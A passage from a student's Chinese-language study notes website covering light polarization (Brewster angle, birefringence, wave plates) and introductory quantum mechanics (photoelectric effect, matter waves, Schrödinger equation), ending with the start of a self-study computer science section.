<p><strong>椭圆偏振光</strong></p>
<p>当两束线偏振光不等强，或者相位差不是<span class="arithmatex">\(k \dfrac{\pi}{2}\)</span>时，合成的光为椭圆偏振光。</p>
<figure>
  <img alt="Image title" src="../NOTE/Physics/img/im.png" width="70%" />
<br />
<figcaption>偏振光分类</figcaption>
</figure>
<p><strong>无偏振光</strong></p>
<p>即最常见的自然光，可以向任意方向振动，没有固定的振动方向。自然光可以看作是由两个振动方向垂直、<mark class="critic">相互间没有固定相位差、等振幅的线偏振光（非相干光）</mark>组合而成的。</p>
<p>无偏振光与圆偏振光的区别在于，传播的时候，无偏振光的振动方向是随机变化的，而圆偏振光的矢量轨迹是一个圆;</p>
<p><strong>部分偏振光</strong></p>
<p>按比例的含有自然光和偏振光的光。振动方向是随机变化的，在其中一个方向上的振动是最强的;</p>
<p><mark class="critic"> 部分偏振光可分解为两束振动方向相互垂直的、不等幅的、不相干的线偏振光。</mark></p>
<p>部分偏振光与椭圆偏振光的区别在于，部分偏振光的振动方向是随机变化的，而椭圆偏振光的矢量轨迹是一个椭圆。</p>
<div class="admonition definition">
<p class="admonition-title">偏振度</p>
<div class="arithmatex">\[
P = \frac{I_{max} - I_{min}}{I_{max} + I_{min}}
\]</div>
<p>其中<span class="arithmatex">\(I_{max}\)</span>是强度最大方向最大光强，<span class="arithmatex">\(I_{min}\)</span>是强度最小方向光强,相减即为偏振光的光强，相加即为总光强。</p>
<p>对于线偏振光，<span class="arithmatex">\(I_{min}=0\)</span>,偏振度为1；对于自然光，<span class="arithmatex">\(I_{max}=I_{min}\)</span>,偏振度为0。</p>
</div>
<h4 id="note-physics-light-brewster">Brewster 角<a class="headerlink" href="#note-physics-light-brewster" title="Permanent link">&para;</a></h4>
<p>当自然光以某一角度入射时(反射角与折射角之和为90度),反射光为线偏振光。</p>
<p>假设入射角为<span class="arithmatex">\(\theta_1\)</span>，折射角为<span class="arithmatex">\(\theta_2\)</span>，则有</p>
<div class="arithmatex">\[
\theta_1 + \theta_2 = 90^\circ
\]</div>
<p>根据折射定律，有</p>
<div class="arithmatex">\[
n_1 \sin \theta_1 = n_2 \sin \theta_2
\]</div>
<p>所以</p>
<div class="arithmatex">\[
    n_1 \sin \theta_1 = n_2 \sin \theta_2   =   n_2 \cos \theta_1
\]</div>
<p>所以</p>
<div class="arithmatex">\[
    \tan \theta_1 = \frac{n_2}{n_1}
\]</div>
<div align=center>
    <img src="../NOTE/Physics/img/light/light44.png" width="60%"/>
</div>

<p>如果经过多次反射，每一次都为brewster角，则最后折射出来的光大部分都为线偏振光。</p>
<h4 id="note-physics-light-birefringence">双折射现象(Birefringence)<a class="headerlink" href="#note-physics-light-birefringence" title="Permanent link">&para;</a></h4>
<div class="admonition definition">
<p class="admonition-title">双折射现象</p>
<p>双折射现象是指当光线通过某些各向异性介质（如方解石晶体）时，会分裂成两束偏振方向互相垂直的光线。这两束光线分别称为普通光（o光）和非常光（e光）;</p>
<p>具体来说，当一束未偏振的光进入双折射介质时，会分裂成两束光线：一束遵循常规折射定律（斯涅尔定律），称为普通光(ordinary light, o光)；另一束则不遵循常规折射定律，称为非常光(extraordinary light, e光)。</p>
<p>对于o光来说，其在介质中四面八方的折射率相同,其速度恒等于<span class="arithmatex">\(v_o\)</span>,对于e光来说，其在介质中四面八方的折射率不同，其速度在不同方向上从<span class="arithmatex">\(v_e\)</span>到<span class="arithmatex">\(v_o\)</span>变化。</p>
<p>称<span class="arithmatex">\(n_o=\dfrac{c}{v_o}\)</span>，<span class="arithmatex">\(n_e=\dfrac{c}{v_e}\)</span>为主折射率；</p>
<p>双折射现象广泛应用于光学仪器中，如偏光显微镜、液晶显示器等。</p>
<p><div align=center>
    <img src="../NOTE/Physics/img/light/birefringence.png" width="60%"/>
</div></p>
</div>
<div class="admonition definition">
<p class="admonition-title">光的快慢轴</p>
<p>对于e光来说，其折射率在介质中不同方向不同，所以其传播速度不同，而频率不变，所以波长会变化；</p>
<p>对于传播方向快的；有</p>
<div class="arithmatex">\[
     v_{fast} = f \lambda_{fast}
\]</div>
<p>对于传播方向慢的；有</p>
<div class="arithmatex">\[
     v_{slow} = f \lambda_{slow}
\]</div>
<p>其中<span class="arithmatex">\(f\)</span>是频率，<span class="arithmatex">\(\lambda\)</span>是波长。</p>
<p>所以<span class="arithmatex">\(\lambda_{fast} &gt; \lambda_{slow}\)</span>。</p>
<p><div align=center>
    <img src="../NOTE/Physics/img/light/light45.png" width="60%"/>
</div></p>
</div>
<h4 id="note-physics-light-optical-axis">光轴(Optical Axis)<a class="headerlink" href="#note-physics-light-optical-axis" title="Permanent link">&para;</a></h4>
<p>o光和e光沿着光轴方向传播时，速度相同，折射率相同，对于 <strong>负晶体而言</strong> ,<span class="arithmatex">\(n_o &gt; n_e\)</span>,<span class="arithmatex">\(v_o&lt; v_e\)</span>，对于 <strong>正晶体而言</strong> ，<span class="arithmatex">\(n_o &lt; n_e\)</span>，<span class="arithmatex">\(v_o &gt; v_e\)</span>。</p>
<figure>
  <img alt="alt text" src="../NOTE/Physics/image-17.png" />
<br />
<figcaption>负晶体</figcaption>
</figure>
<p>常见的负晶体有<span class="arithmatex">\(CaCO_3\)</span></p>
<figure>
  <img alt="alt text" src="../NOTE/Physics/image-18.png" />
<br />
<figcaption>正晶体</figcaption>
</figure>
<p>常见的正晶体有二氧化硅<span class="arithmatex">\(SiO_2\)</span></p>
<p><mark class="critic"> 将光轴和光的传播方向构成的平面称为主平面(Principal Plane)。</mark></p>
<ul>
<li>o光：振动方向垂直于主平面；</li>
<li>e光：振动方向平行于主平面；</li>
</ul>
<div class="admonition idea">
<p class="admonition-title">光轴与快慢轴之间的关系</p>
<p>负晶体而言,e光在光轴方向传播速度最慢，其它地方比o光快，光轴为慢轴，与光轴垂直的，传播速度最快的方向为快轴；</p>
<p>正晶体而言,e光在光轴方向传播速度最快，其它地方比o光慢，光轴为快轴，与光轴垂直的，传播速度最慢的方向为慢轴；</p>
</div>
<div align=center>
    <img src="../NOTE/Physics/img/light/light46.png" width="60%"/>
</div>

<p>图中画虚线的为光轴，当一束光照向这样的结构时，<mark class="critic">可以将其振动方向分解为o光和e光的振动方向</mark>，由于光轴方向上o光和e光的速度相同，所以o光和e光在光轴方向上传播的距离相同，所以o光和e光在光轴方向上的相位差为0，但是在传播方向上，e光的速度为<span class="arithmatex">\(v_e\)</span>，o光的速度为<span class="arithmatex">\(v_o\)</span>，所以e光和o光的相位差为</p>
<div align=center>
    <img src="../NOTE/Physics/img/light/light47.png" width="60%"/>
</div>

<div class="arithmatex">\[
    \Delta \phi = \dfrac{2\pi}{\lambda} (n_e - n_o) d
\]</div>
<p>其中<span class="arithmatex">\(d\)</span>是片的厚度</p>
<div class="admonition note">
<p class="admonition-title">QWP和FWP</p>
<ul>
<li>QWP：Quarter Wave Plate，四分之一波片，<span class="arithmatex">\(\Delta \phi = \dfrac{\pi}{2}\)</span></li>
</ul>
<div class="arithmatex">\[
    (n_o-n_e)d = \pm \dfrac{\lambda}{4}
\]</div>
<ul>
<li>HWP：Half Wave Plate，半波片，<span class="arithmatex">\(\Delta \phi = \pi\)</span></li>
</ul>
<div class="arithmatex">\[
     (n_o-n_e)d = \pm \dfrac{\lambda}{2}
\]</div>
<ul>
<li>FWP：Full Wave Plate，全波片，<span class="arithmatex">\(\Delta \phi = 2\pi\)</span></li>
</ul>
<div class="arithmatex">\[
    (n_o-n_e)d = \pm \lambda
\]</div>
</div>
<p>当光通过QWP时,o光和e光的相位差为<span class="arithmatex">\(\dfrac{\pi}{2}\)</span>;</p>
<ul>
<li>
<p>如果是线偏振光,则一开始将其分解为o光和e光的振动方向,原本的相位差为<span class="arithmatex">\(k\pi\)</span>,通过QWP后,相位差为<span class="arithmatex">\(k\pi+\dfrac{\pi}{2}\)</span>,所以合成后出射的光为圆偏振光。</p>
</li>
<li>
<p>如果是圆偏振光,则通过QWP后,相位差为<span class="arithmatex">\(k\pi\)</span>。所以合成后出射的光为线偏振光。</p>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">例子</p>
<p><div align=center>
    <img src="../NOTE/Physics/img/light/light48.png" width="40%"/>
</div></p>
<p>一束自然光通过45度偏振片后，出射的光为线偏振光，再通过QWP后，出射光满足</p>
<div class="arithmatex">\[
E_x =E_0 \sin (kz-\omega t)
\]</div>
<div class="arithmatex">\[
E_y =-E_0 \cos (kz-\omega t)
\]</div>
<p>即慢轴不变，快轴变为<span class="arithmatex">\(\sin(kz-\omega t-\dfrac{\pi}{2})\)</span>，所以合成后出射的光为圆偏振光。为RCP,注意，快轴领先，所以它会先到达最大，所以是减去，在图上看来也是如此,从缝里出来后，先遇到了快轴的最大(<span class="arithmatex">\(-y\)</span>方向上)，然后才是慢轴的最大。</p>
<p><div align=center>
    <img src="../NOTE/Physics/img/light/light49.png" width="40%"/>
</div></p>
</div>
<div class="admonition eg">
<p class="admonition-title">例子</p>
<p><div align=center>
    <img src="../NOTE/Physics/img/light/light50.png" width="40%"/>
</div></p>
<p>对于3A,第一次无法将振动方向分解为o光和e光的振动方向，所以出射的光仍为原光，第二次完全被阻挡，所以出射的光为0，<span class="arithmatex">\(I_1=0\)</span></p>
<p>对于3B,第一次将振动方向分解为o光和e光的振动方向，由于是<span class="arithmatex">\(1/4\)</span>波片，所以出射的光为圆偏振光,</p>
<div class="arithmatex">\[
    E_s =E_f  = \dfrac{E_0}{\sqrt{2}}
\]</div>
<p>第二次相当于两束线偏振光经过,由马隆定律可知</p>
<div class="arithmatex">\[
    E'_s = E'_f =  \dfrac{E_0}{\sqrt{2}} \cos 45^\circ = \dfrac{E_0}{2}
\]</div>
<p>由于快慢光独立衰减，所以最后的光强为</p>
<div class="arithmatex">\[
    I_2 = I_s + I_f = \dfrac{E_0^2}{4} + \dfrac{E_0^2}{4} = \dfrac{I_0}{2}
\]</div>
</div>
<div class="admonition danger">
<p class="admonition-title">Danger</p>
<p>虽说e光并不满足折射定律，但是有一种例外，当光轴与入射面垂直时(主平面与入射面垂直,光轴和法线平行)，e光满足折射定律,有</p>
<div class="arithmatex">\[
    n_e \sin \theta_e = n_1 \sin \theta_1
\]</div>
<p>和</p>
<div class="arithmatex">\[
    n_o \sin \theta_o  = n_1 \sin \theta_1
\]</div>
<p><figure markdown="span">
    <img alt="alt text" src="../NOTE/Physics/image-19.png" width="60%" />
    <figcaption>示意图</figcaption>
</figure></p>
<p>不要把法线和光轴搞混了(-_-)</p>
</div></section><section class="print-page" id="note-physics-quantum" heading-number="2.3.4.7"><h1 id="note-physics-quantum-_1">量子力学<a class="headerlink" href="#note-physics-quantum-_1" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 1936 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 7 分钟</p>
</div>
<blockquote>
<p>普物的最后一舞，加油！💪</p>
</blockquote>
<h2 id="note-physics-quantum-the-nature-of-light">The nature of light(光的本质)<a class="headerlink" href="#note-physics-quantum-the-nature-of-light" title="Permanent link">&para;</a></h2>
<div class="admonition definition">
<p class="admonition-title">黑体辐射</p>
<p>黑体辐射是指一种理想化的物体（称为黑体）在热平衡状态下发出的电磁辐射。黑体能够吸收所有入射的电磁辐射，而不反射或透射任何辐射</p>
<p><strong>普朗克辐射定律</strong></p>
<div class="arithmatex">\[
     R(\lambda, T) = \frac{2\pi hc^2}{\lambda^5} \frac{1}{e^{\frac{hc}{\lambda kT}} - 1} 
\]</div>
<p><span class="arithmatex">\( h = 6.63 \times 10^{-34} \, \text{J} \cdot \text{s} \)</span></p>
<p>常见的的表达有普朗克常数<span class="arithmatex">\(h\)</span> 和 约化普朗克常数<span class="arithmatex">\(\hbar = \frac{h}{2\pi}\)</span></p>
</div>
<h3 id="note-physics-quantum-_2">光子的性质<a class="headerlink" href="#note-physics-quantum-_2" title="Permanent link">&para;</a></h3>
<p>光具有波粒二象性，光子具有能量和动量。</p>
<ul>
<li>
<p>波： <span class="arithmatex">\(\bold{E}=E_m \cos(kx-\omega t)\)</span>,或者<span class="arithmatex">\(\bold{E}=E_e e^{i(kx-\omega t)}\)</span></p>
<ul>
<li><span class="arithmatex">\(k\)</span> 波数，<span class="arithmatex">\(k = \frac{2\pi}{\lambda}\)</span></li>
<li><span class="arithmatex">\(\omega\)</span> 角频率，<span class="arithmatex">\(\omega = \frac{2\pi}{T}\)</span></li>
<li><span class="arithmatex">\(T\)</span> 周期，<span class="arithmatex">\(T = \frac{1}{f}\)</span></li>
<li><span class="arithmatex">\(f\)</span> 频率，<span class="arithmatex">\(f = \frac{\omega}{2\pi}\)</span></li>
</ul>
</li>
<li>
<p>粒子： <span class="arithmatex">\(E=h\nu=h\dfrac{\omega}{2\pi}=\hbar\omega\)</span>,同时能量和动量满足关系<span class="arithmatex">\(E=mc^2=pc\)</span></p>
<ul>
<li>动量<span class="arithmatex">\(p=\dfrac{E}{c}=\dfrac{h\nu}{c}=\dfrac{h \nu}{\nu \lambda}=\dfrac{h}{\lambda}=\dfrac{h}{\frac{2\pi}{k}}=\dfrac{h}{2\pi}k=\hbar k\)</span></li>
</ul>
</li>
</ul>
<div class="admonition quote">
<p class="admonition-title">光电效应</p>
<p>光电效应是指当光照射到某种材料（通常是金属）表面时，会导致材料表面释放出电子的现象。这一效应是由爱因斯坦在1905年解释的，他提出光子具有粒子性质，并且每个光子的能量与其频率成正比。光电效应的关键特征包括：</p>
<ol>
<li>
<p><strong>阈值频率</strong>：只有当入射光的频率高于某个特定值（阈值频率）时，才会发生光电效应。这是因为光子的能量必须大于材料中电子的逸出功（即将电子从材料中释放所需的最小能量）。</p>
</li>
<li>
<p><strong>光子能量与电子动能</strong>：入射光子的能量一部分用于克服材料的逸出功，剩余的能量转化为电子的动能。公式为：</p>
</li>
</ol>
<div class="arithmatex">\[
   E_{\text{光子}} = h\nu = W + \frac{1}{2}mv^2
\]</div>
<p>其中，<span class="arithmatex">\( h \)</span> 是普朗克常数，<span class="arithmatex">\( \nu \)</span> 是光的频率，<span class="arithmatex">\( W \)</span> 是逸出功，<span class="arithmatex">\( m \)</span> 是电子的质量，<span class="arithmatex">\( v \)</span> 是电子的速度。</p>
<ol>
<li><strong>光强度与电子数量</strong>：增加入射光的强度（即光子数量）会增加释放的电子数量，但不会影响电子的最大动能。</li>
</ol>
<p>光电效应的发现和解释为量子力学的发展奠定了基础，并且为光的粒子性提供了重要的证据。</p>
</div>
<h2 id="note-physics-quantum-matter-wave">Matter Wave(物质波)<a class="headerlink" href="#note-physics-quantum-matter-wave" title="Permanent link">&para;</a></h2>
<blockquote>
<p>🐅:神人德布罗意</p>
</blockquote>
<p>物质波是德布罗意在1924年提出的一个概念，他认为任何物质都具有波动性，但是在提出这一概念之前，他并没有系统的学过物理；</p>
<p>对于宏观世界速度为<span class="arithmatex">\(v\)</span>,质量为<span class="arithmatex">\(m\)</span>的粒子</p>
<ul>
<li>动量<span class="arithmatex">\(p=mv\)</span></li>
<li>动能<span class="arithmatex">\(E_k=\frac{1}{2}mv^2\)</span></li>
</ul>
<p>其波性质为</p>
<ul>
<li><span class="arithmatex">\(E = h\nu=\hbar\omega\)</span></li>
<li><span class="arithmatex">\(p = h/\lambda=\hbar k\)</span></li>
</ul>
<p>其波长为</p>
<ul>
<li><span class="arithmatex">\(\lambda = \dfrac{h}{p}=\dfrac{h}{mv}=\dfrac{h}{\sqrt{2mE_k}}\)</span></li>
</ul>
<p>其满足这样一个波函数</p>
<div class="arithmatex">\[
\Psi=\psi(x,t)=Ae^{i(kx-\omega t)}=Ae^{\frac{i}{\hbar}(px-Et)}
\]</div>
<h3 id="note-physics-quantum-_3">波函数的物理解释<a class="headerlink" href="#note-physics-quantum-_3" title="Permanent link">&para;</a></h3>
<p>物质波是一种概率波</p>
<p>The product <span class="arithmatex">\(\Psi^*\Psi\)</span> gives the probability that the particle in question will be found between positions <span class="arithmatex">\(x\)</span> and <span class="arithmatex">\(x+dx\)</span>. </p>
<p>即</p>
<p>波函数的平方模 <span class="arithmatex">\(\Psi^*\Psi\)</span> 表示粒子在位置 <span class="arithmatex">\(x\)</span> 到 <span class="arithmatex">\(x+dx\)</span> 之间被找到的概率。
公式为：</p>
<div class="arithmatex">\[
\text{Probability} = \Psi^*\Psi \, dx
\]</div>
<p>其中，<span class="arithmatex">\(\Psi^*\)</span> 是波函数的复共轭，<span class="arithmatex">\(dx\)</span> 是位置的微小变化量。</p>
<p>将几率密度定义为</p>
<div class="arithmatex">\[
P(x) = \Psi^*\Psi
\]</div>
<p>若要求粒子在<span class="arithmatex">\(x_1\)</span>到<span class="arithmatex">\(x_2\)</span>之间被找到的概率，则</p>
<div class="arithmatex">\[
P(x_1,x_2) = \int_{x_1}^{x_2} P(x) \, dx
\]</div>
<p>同时其满足归一化</p>
<div class="arithmatex">\[
\int_{-\infty}^{+\infty} \Psi^*\Psi \, dx = 1
\]</div>
<p>对于自由粒子而言</p>
<div class="arithmatex">\[
P(x) = \left[ \psi_0 e^{i(kx - \omega t)} \right] \left[ \psi_0^* e^{-i(kx - \omega t)} \right] = |\psi_0|^2
\]</div>
<p>是一个很小的常量</p>
<h3 id="note-physics-quantum-_4">算符定义<a class="headerlink" href="#note-physics-quantum-_4" title="Permanent link">&para;</a></h3>
<h4 id="note-physics-quantum-_5">期望算符<a class="headerlink" href="#note-physics-quantum-_5" title="Permanent link">&para;</a></h4>
<p>一个粒子的期望位置</p>
<div class="arithmatex">\[
\bar{x} = \frac{\int_{-\infty}^{+\infty} x \Psi^* \Psi \, dx}{\int_{-\infty}^{+\infty} \Psi^* \Psi \, dx} = \frac{\int_{-\infty}^{+\infty} \Psi^* x \Psi \, dx}{\int_{-\infty}^{+\infty} \Psi^* \Psi \, dx} = \int_{-\infty}^{+\infty} \Psi^* x \Psi \, dx = \langle \psi | x | \psi \rangle = \langle |x|\rangle,
\]</div>
<p>两个角代表被<span class="arithmatex">\(\Psi^*\)</span> 和 <span class="arithmatex">\(\Psi\)</span> 夹住做积分</p>
<p>如果求其它量例如势能的期望值也是类似的,例如<span class="arithmatex">\(\langle \psi |U(x)|\psi \rangle\)</span></p>
<h4 id="note-physics-quantum-momentum-operator">动量算符(momentum operator)<a class="headerlink" href="#note-physics-quantum-momentum-operator" title="Permanent link">&para;</a></h4>
<p>对于<span class="arithmatex">\(\Psi = \psi_0 e^{i(kx-\omega t)}\)</span></p>
<p>对 <span class="arithmatex">\(x\)</span> 求导数</p>
<div class="arithmatex">\[
\frac{\partial \Psi}{\partial x} = ik\psi_0 e^{i(kx-\omega t)}
\]</div>
<div class="arithmatex">\[
-i\hbar \frac{\partial \Psi}{\partial x} = (-i\hbar) ik \psi_0 e^{i(kx-\omega t)} = \hbar k \psi_0 e^{i(kx-\omega t)}
\]</div>
<p>而<span class="arithmatex">\(\hbar k\)</span> 就是动量<span class="arithmatex">\(p\)</span></p>
<p>所以</p>
<div class="arithmatex">\[
-i\hbar \frac{\partial \Psi}{\partial x} = p \Psi
\]</div>
<p><mark class="critic"> 动量算符为 $ p= -i\hbar \frac{\partial}{\partial x}$</mark></p>
<p>用动量算符求动量</p>
<div class="arithmatex">\[
\begin{align*}
\therefore \bar{p} &amp;= \int_{-\infty}^{+\infty} \Psi^* \left( -i\hbar \frac{\partial}{\partial x} \right) \Psi \, dx \\
&amp;= \int_{-\infty}^{+\infty} \Psi^* \left( -i\hbar \frac{\partial}{\partial x} \right) \psi_0 e^{i(kx-\omega t)} \, dx \\
&amp;= \int_{-\infty}^{+\infty} \Psi^* (-i\hbar) ik \psi_0 e^{i(kx-\omega t)} \, dx \\
&amp;= \hbar k \int_{-\infty}^{+\infty} \Psi^* \psi_0 e^{i(kx-\omega t)} \, dx \\
&amp;= \hbar k \int_{-\infty}^{+\infty} \Psi^* \Psi \, dx \\
&amp;= \hbar k
\end{align*}
\]</div>
<h4 id="note-physics-quantum-energy-operator">能量算符(Energy operator)<a class="headerlink" href="#note-physics-quantum-energy-operator" title="Permanent link">&para;</a></h4>
<div class="arithmatex">\[
\frac{\partial \Psi}{\partial t} = -i\omega \psi_0 e^{i(kx-\omega t)}
\]</div>
<div class="arithmatex">\[
i\hbar \frac{\partial \Psi}{\partial t} = (i\hbar)(-i\omega)\psi_0 e^{i(kx-\omega t)} = \hbar \omega \psi_0 e^{i(kx-\omega t)} = E\Psi
\]</div>
<p><mark class="critic"> 能量算符为 <span class="arithmatex">\(E = i\hbar \frac{\partial}{\partial t}\)</span> </mark></p>
<p>用能量算符求能量</p>
<div class="arithmatex">\[
\begin{align*}
\therefore \bar{E} &amp;= \int_{-\infty}^{+\infty} \Psi^* \left( i\hbar \frac{\partial}{\partial t} \right) \Psi \, dx \\
&amp;= \int_{-\infty}^{+\infty} \Psi^* \left( i\hbar \frac{\partial}{\partial t} \right) \psi_0 e^{i(kx-\omega t)} \, dx \\
&amp;= \int_{-\infty}^{+\infty} \Psi^* (i\hbar)(-i\omega) \psi_0 e^{i(kx-\omega t)} \, dx \\
&amp;= \hbar \omega \int_{-\infty}^{+\infty} \Psi^* \psi_0 e^{i(kx-\omega t)} \, dx \\
&amp;= \hbar \omega \int_{-\infty}^{+\infty} \Psi^* \Psi \, dx \\
&amp;= \hbar \omega
\end{align*}
\]</div>
<h3 id="note-physics-quantum-_6">薛定谔方程<a class="headerlink" href="#note-physics-quantum-_6" title="Permanent link">&para;</a></h3>
<p>对于一个粒子的总能量，有势能和动能</p>
<div class="arithmatex">\[
E = U + \frac{p^2}{2m}
\]</div>
<p>两边同时乘以波函数<span class="arithmatex">\(\Psi\)</span></p>
<div class="arithmatex">\[
E\Psi = U\Psi + \frac{p^2}{2m}\Psi
\]</div>
<p>将<span class="arithmatex">\(E\)</span> 和 <span class="arithmatex">\(p\)</span> 用算符表示</p>
<div class="arithmatex">\[
E\Psi = \frac{p^2}{2m} \Psi + U\Psi
\]</div>
<div class="arithmatex">\[
i\hbar \frac{\partial}{\partial t} \Psi = \frac{1}{2m} (-i\hbar \frac{\partial}{\partial x})(-i\hbar \frac{\partial}{\partial x}) \Psi + U\Psi
\]</div>
<div class="arithmatex">\[
i\hbar \frac{\partial}{\partial t} \Psi = -\frac{\hbar^2}{2m} \frac{\partial^2}{\partial x^2} \Psi + U\Psi
\]</div>
<p>称其为一维含时薛定谔方程</p>
<p>简写为</p>
<div class="arithmatex">\[
i\hbar \frac{\partial}{\partial t} \Psi = \hat{H} \Psi
\]</div>
<p>其中<span class="arithmatex">\(\hat{H}\)</span> 为哈密顿算符,也是能量算符</p>
<ul>
<li>一维 <span class="arithmatex">\(\hat{H} = -\frac{\hbar^2}{2m} \frac{\partial^2}{\partial x^2} + U(x,t)\)</span></li>
<li>三维 <span class="arithmatex">\(\hat{H} = -\frac{\hbar^2}{2m} \nabla^2 + U(x,y,z,t)\)</span></li>
</ul>
<h4 id="note-physics-quantum-_7">定态薛定谔方程<a class="headerlink" href="#note-physics-quantum-_7" title="Permanent link">&para;</a></h4>
<p>如果说势能<span class="arithmatex">\(U\)</span> 不随时间变化，则波函数可以写成</p>
<div class="arithmatex">\[
\Psi(x,t) = \psi(x) e^{-i\omega t} = \psi  e^{-i\omega t}
\]</div>
<div class="arithmatex">\[
i\hbar \frac{\partial}{\partial t} \Psi = -\frac{\hbar^2}{2m} \frac{\partial^2}{\partial x^2} \Psi + U\Psi
\]</div>
<div class="arithmatex">\[
i\hbar \frac{\partial}{\partial t} (\psi e^{-i\omega t}) = -\frac{\hbar^2}{2m} \frac{\partial^2}{\partial x^2} (\psi e^{-i\omega t}) + U\psi e^{-i\omega t}
\]</div>
<div class="arithmatex">\[
(-i\omega) i\hbar \psi e^{-i\omega t} = -\frac{\hbar^2}{2m} \frac{d^2 \psi}{dx^2} e^{-i\omega t} + U\psi e^{-i\omega t}
\]</div>
<p>含<span class="arithmatex">\(t\)</span>的项消去，得到</p>
<div class="arithmatex">\[
\hbar \omega \psi = -\frac{\hbar^2}{2m} \frac{d^2 \psi}{dx^2} + U\psi
\]</div>
<p>再运用<span class="arithmatex">\(E = \hbar \omega\)</span> </p>
<div class="arithmatex">\[
E\psi(x) = -\frac{\hbar^2}{2m} \frac{d^2 \psi(x)}{dx^2} + U\psi(x)
\]</div>
<p>称其为一维定态薛定谔方程</p>
<p>可以化为</p>
<div class="arithmatex">\[
    \frac{d^2 \psi(x)}{dx^2} + \frac{2m}{\hbar^2}(E - U)\psi(x) = 0
\]</div>
<div class="admonition info">
<p class="admonition-title">其它定义</p>
<p>虎哥只提了一下，那我也只记一下</p>
<ul>
<li>势垒隧道（barrier tunneling）</li>
</ul>
<p>势垒隧道是指在量子力学中，粒子能够穿过势垒（势能）的量子效应。势垒隧道效应是量子力学中的一个基本现象，它描述了粒子在势垒（通常是势能）的阻挡下仍然能够穿透的现象。</p>
<ul>
<li>测不准原理（Uncertainty principle）</li>
</ul>
<p>测不准原理是指在量子力学中，粒子的位置和动量不能同时被精确测量。这意味着，如果我们试图精确测量粒子的位置，那么它的动量就会变得不确定，反之亦然。</p>
<div class="arithmatex">\[
    \Delta x \Delta p \geq \frac{\hbar}{2}
\]</div>
<p>同样能量和时间也有这样的关系</p>
<div class="arithmatex">\[
    \Delta E \Delta t \geq \frac{\hbar}{2}
\]</div>
</div></section></section></section>
                    <section class='print-page md-section' id='section-2-4' heading-number='2.4'>
                        <h1>💻 自学笔记<a class='headerlink' href='#section-2-4' title='Permanent link'></a>
                        </h1>
                    <section class="print-page" id="note-cs" heading-number="2.4.1"><h1 id="note-cs-_1">一些自学<a class="headerlink" href="#note-cs-_1" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 23 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间不到 1 分钟</p>
</div>
<blockquote>
<p>不定期更新</p>
</blockquote>
<div class="toc-container">
    <div class="toc-header">目录</div>
    <ul class="toc">
        <li><a href="#note-cs-asm-wk1">汇编基础</a></li>
        <li><a href="#note-cs-verilog-verilog">Verilog</a></li>
        <li><a href="#note-cs-rust-rust">Rust</a></li>
        <li><a href="#note-cs-git">Git</a></li>
        <li><a href="#note-cs-tms">The Missing Semester</a></li>
        <li><a href="#note-cs-cv">Computer Version</a></li>
    </ul>

</div></section>
                    <section class='print-page md-section' id='section-2-4-2' heading-number='2.4.2'>
                        <h1>Missing Semester (TMS)<a class='headerlink' href='#section-2-4-2' title='Permanent link'></a>
                        </h1>
                    <section class="print-page" id="note-cs-tms" heading-number="2.4.2.1"><h1 id="note-cs-tms-the-missing-semester">The Missing Semester<a class="headerlink" href="#note-cs-tms-the-missing-semester" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 254 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 1 分钟</p>
</div>
<p>The Missing Semester 是一门由 MIT 开设的课程，旨在填补计算机科学教育中常常被忽略的部分。课程内容涵盖了实用的计算机技能和工具，如命令行操作、版本控制、脚本编写、编辑器使用等。这些技能对于计算机科学专业的学生和从业者来说至关重要，但在传统的课程设置中往往没有得到足够的重视。</p>
